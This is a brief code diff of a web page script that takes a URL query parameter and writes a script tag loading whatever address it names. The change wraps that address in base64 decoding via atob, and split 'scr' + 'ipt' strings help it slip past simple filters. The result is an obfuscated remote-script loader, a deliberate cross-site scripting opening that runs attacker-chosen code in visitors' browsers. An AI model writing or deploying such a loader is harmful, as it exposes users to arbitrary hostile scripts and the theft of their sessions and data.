@@ -5,6 +5,6 @@
                  results = regex.exec(location.search);
              return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
          }
-document.write('<scr' + 'ipt type="text/javascript" src="'+getParameterByName('u')+'"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="'+atob(getParameterByName('u'))+'"></scr' + 'ipt>');
 
 </script>
